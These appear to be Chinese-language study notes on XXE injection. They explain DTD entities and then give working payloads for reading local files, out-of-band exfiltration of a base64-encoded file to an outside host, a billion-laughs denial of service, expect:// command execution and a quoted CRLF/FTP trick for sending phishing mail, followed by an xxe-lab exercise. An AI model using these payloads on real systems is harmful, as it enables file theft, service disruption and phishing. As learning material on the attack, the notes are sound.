XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素

文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。

关键的注入点在 DTD 里面
## 关于 DTD
1. 内部声明DTD:
`<!DOCTYPE 根元素 [元素声明]>`
2. 引用外部DTD:
`<!DOCTYPE 根元素 SYSTEM "文件名">`

DTD 文档中有很多重要的关键字如下：

- DOCTYPE（DTD 的声明）
- ENTITY（实体的声明）
- SYSTEM、PUBLIC（外部资源申请）

### 内部实体

```xml
<?xml version="1.0"?>
<!DOCTYPE test[
    <!ENTITY article "XXE">
    <!ENTITY author "xxe user">
]>
<test><article>&article;</article><author>&author;</author></test>
```

成功解析后，显示的内容是 `XXExxe user`

### 外部实体

```xml
<?xml version="1.0"?>
<!DOCTYPE test[
    <!ENTITY author SYSTEM "file.xml">
    <!ENTITY file SYSTEM "file:///etc/passwd">
    <!ENTITY http SYSTEM "http://127.0.0.1/whoami.xml>
]>
<test><author>&author;</author><file>&file;</file></test>
```

这里有两种实体：
- 包含了内部文件的实体（第三行）
- 包含了协议的实体（第四、五行）

另外，外部实体声明中，还分为`SYSTEM`和`PUBLIC`，前者私有而后者公有，前者出现更多

这种是最**危险**的，因为它能从外部注入

### 参数实体

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  %file;
]>
```

参数实体需要 %

## 进攻手段

### 检测

1. 检测XML是否会被成功解析：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY [
	<!ENTITY name "my name is xxe">
]>
<root>&name;</root>
```

如果页面输出了my name is xxe，说明xml文件可以被解析

2. 检测服务器是否支持 DTD 引用外部实体：

```xml
<?xml version=”1.0” encoding=”UTF-8”?>
<!DOCTYPE ANY [
	<!ENTITY % name SYSTEM "http://localhost/index.html">
	%name;
]>
```

如果我们的服务器收到了请求，就说明服务器支持 DTD 引用外部实体

满足这两个条件的话，就可以尝试有没有 XXE 了

### 进攻

这个库可供参考：[Fetching Title#kytv](https://github.com/payloadbox/xxe-injection-payload-list)

#### 远程文件调用

在知道可能存在 XXE 之后，就动手

首先向服务器发一个这样的 xml

```xml
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://eval.top/eval.xml">
%remote;%payload;%send;
]>
```

eval.xml 里面则是这样的

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///d:/flag.txt">
<!ENTITY % payload "
	<!ENTITY &#x25; send SYSTEM 'http://eval.top/?content=%file;'>
">
```

组合的意思起来就是：服务器先访问 eval.top，然后将本地文件 flag.txt 进行 base64 加密后传回 eval.top

#### 文件包含

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

无回显时

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]>
<foo>&blind;</foo>
```

#### DOS

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "dos">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

通过套娃引用提升机器内部内存占用

> 如果换成 url 是不是威力加倍？

#### RCE

php 的 expect 扩展可以直接执行系统命令，但这个拓展并不是默认就有的

```xml
<!DOCTYPE root[<!ENTITY cmd SYSTEM "expect://id">]>
<dir>
	<file>&cmd;</file>
</dir>
```

回显就会是这样的

```xml
<file>uid=501(Apple) gid=20(staff) 
groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),
80(admin),81(_appserveradm),98(_lpadmin),401(com.apple.sharepoint.group.1),
33(_appstore),100(_lpoperator),204(_developer),398(com.apple.access_screensharing),
399(com.apple.access_ssh)<file>
```

因为装这个插件的少，不指望

#### 钓鱼

> 源自 [XXE漏洞利用技巧：从XML到远程代码执行](https://www.secflag.com/archives/439.html)，因为我没看懂所以直接粘了

我们使用Java的XML解析器找到了一个易受攻击的端点。扫描内部端口后，我们发现了一个侦听在 25 端口的 SMTP 服务，Java 支持在 [sun.net.ftp.impl.FtpClient](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/net/ftp/impl/FtpClient.java) 中的 ftp URI。因此，我们可以指定用户名和密码，例如 ftp://user:password@host:port/test.txt ，FTP客户端将在连接中发送相应的 USER 命令。

但是如果我们将 %0D%0A ([CRLF](https://www.owasp.org/index.php/CRLF_Injection)) 添加到 URL 的 user 部分的任意位置，我们就可以终止 USER 命令并向 FTP 会话中注入一个新的命令，即允许我们向25端口发送任意的 SMTP 命令：

```
ftp://a%0D%0A
EHLO%20a%0D%0A
MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
DATA%0D%0A
From%3A%20support%40VULNERABLESYSTEM.com%0A
To%3A%20victim%40gmail.com%0A
Subject%3A%20test%0A
%0A
test!%0A
%0D%0A
.%0D%0A
QUIT%0D%0A
:a@VULNERABLESYSTEM.com:25
```

当FTP客户端使用此 URL 连接时，以下命令将会被发送给 VULNERABLESYSTEM.com 上的邮件服务器：

```
ftp://a
EHLO a
MAIL FROM: <support@VULNERABLESYSTEM.com>
RCPT TO: <victim@gmail.com>
DATA
From: support@VULNERABLESYSTEM.com
To: victim@gmail.com
Subject: Reset your password
We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com
.
QUIT
:support@VULNERABLESYSTEM.com:25
```

这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。

## 实战

[GitHub - c0ny1/xxe-lab: 一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo](https://github.com/c0ny1/xxe-lab/tree/master)

搭建完以后，随便输尝试一下，burp 显示如下内容：

```xml
<user>
	<username>
		2
	</username>
	<password>
		1
	</password>
</user>
```

tips 显示了 username 字段

再去看源码

```python
#coding=utf-8
from flask import Flask, request, url_for, render_template, redirect
from xml.dom import minidom
app = Flask(__name__)
app.config['DEBUG'] = True
USERNAME = 'admin' # 账号
PASSWORD = 'admin' # 密码
@app.route("/")
def home():
    return render_template("index.html")
@app.route("/doLogin", methods=['POST', 'GET'])
def doLogin():
    result = None
    try:
        DOMTree = minidom.parseString(request.data)
        username = DOMTree.getElementsByTagName("username")
        username = username[0].childNodes[0].nodeValue
        password = DOMTree.getElementsByTagName("password")
        password = password[0].childNodes[0].nodeValue
        if username == USERNAME and password == PASSWORD:
            result = "<result><code>%d</code><msg>%s</msg></result>" % (1,username)
        else:
            result = "<result><code>%d</code><msg>%s</msg></result>" % (0,username)
    except Exception as e:
        result = "<result><code>%d</code><msg>%s</msg></result>" % (3,e.message)
    return result,{'Content-Type': 'text/xml;charset=UTF-8'}
def prn_obj(obj):
    print ('\n'.join(['%s:%s' % item for item in obj.__dict__.items()]))
if __name__ == "__main__":
    app.run()
```

没有过滤，burp 又知道没有对 xml 做任何限制

那先试探性地整点

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY [
	<!ENTITY name "my name is xxe">
]>
<user><username>&name;</username><password>1</password></user>
```

在 burp 中改成上面那个样，然后提交

![[Pasted image 20240221152313.png]]

好，我们更进一步

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
	<!ENTITY url SYSTEM "file://D:\test.txt">
	<!ENTITY name "my name is xxe">
]>
<user><username>&url;</username><password>1</password></user>
```

报错：

```
127.0.0.1 - - [21/Feb/2024 16:24:16] "POST /doLogin HTTP/1.1" 500 -
Traceback (most recent call last):
  File "C:\Users\sirius\Downloads\python_xxe\xxe.py", line 27, in doLogin
    username = username[0].childNodes[0].nodeValue
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
IndexError: list index out of range
```

也就是说 username 现在是空数组

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
	<!ENTITY url SYSTEM "file://D:\test.txt">
	<!ENTITY name "my name is xxe">
	<!ENTITY usern "&url;">
]>
<user><username>&usern;</username><password>1</password></user>
```

再次尝试依旧错误，虽然 usern 指向 name 时有效

去看别人的解题思路：
> 若是以 file 和 http 协议读取 .php 文件则会报错，因为 php 文件中含有 <>// 等特殊字符，xml 解析时会当成 xml 语法进行解析。那我们若是要读取 php 文件则可以使用 php://filter/read=convert.base64-encode/resource=/etc/hosts 方法对内容进行 base64 编码

我搭建用的 python，所以只能考虑别的方式去处理文件协议